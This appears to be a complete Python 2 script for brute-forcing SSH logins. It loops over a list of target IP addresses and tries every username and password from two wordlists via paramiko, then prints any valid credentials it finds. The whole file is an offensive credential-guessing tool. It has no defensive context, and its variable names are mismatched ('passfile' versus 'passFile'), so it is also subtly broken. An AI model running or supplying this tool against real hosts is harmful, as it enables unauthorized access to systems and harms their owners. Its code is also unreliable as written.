#!/usr/bin/python2
import paramiko
import sys

def AttackSSH(ipAddress, userFile, passFile):
    print "[+] Attacking Host : %s " %(ipAddress)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for line in open(userFile, "r").readlines():
        username = line.strip()
        for line in open(passfile, "r").readlines():
            password = line.strip()
            try:
                print "[+] Trying username: %s password: %s " %(username, password)
                ssh.connect(ipAddress, username=username, password=password)
            except paramiko.AuthenticationException:
                print "[-] Failed! ..."
                continue # we could exit, but thats not a brute force, is it? 
            print "[+] Success ... username: %s and password %s is VALID! " %(username, password)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit("Usage: %s <iplist.lst> <usernames.lst> <passwords.lst>" %(sys.argv[0]))
    else:
        for line in open(sys.argv[1], "r").readlines():
            ip = line.strip()
            AttackSSH(ip, sys.argv[2], sys.argv[3])

